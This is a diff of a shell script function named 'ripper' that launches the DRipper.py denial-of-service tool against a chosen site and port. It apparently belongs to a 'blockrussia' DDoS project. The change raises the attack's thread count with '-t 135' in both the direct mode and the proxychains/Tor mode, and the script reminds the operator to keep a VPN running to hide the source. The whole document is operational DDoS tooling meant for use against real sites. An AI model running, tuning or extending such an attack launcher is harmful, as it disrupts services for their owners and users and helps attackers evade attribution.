@@ -6,12 +6,12 @@ function ripper() {
 
   if [ "$MODE" == "default" ]; then
     echo "Working in default mode. Please, ensure that VPN is UP and running"
-    cd /opt/blockrussia/ripper && python3 DRipper.py -s ${site} -p ${port} | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
+    cd /opt/blockrussia/ripper && python3 DRipper.py -s ${site} -p ${port} -t 135 | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
   elif [ "$MODE" == "proxy" ] || [ "$MODE" == "proxy-custom" ] ; then
     echo "Working using Tor Network. Tyring to work through proxies defined in configuration file"
     cat /etc/proxychains.conf
 
-    cd /opt/blockrussia/ripper && proxychains python3 DRipper.py -s ${site} -p ${port} | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
+    cd /opt/blockrussia/ripper && proxychains python3 DRipper.py -s ${site} -p ${port} -t 135 | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
   fi
 }
 
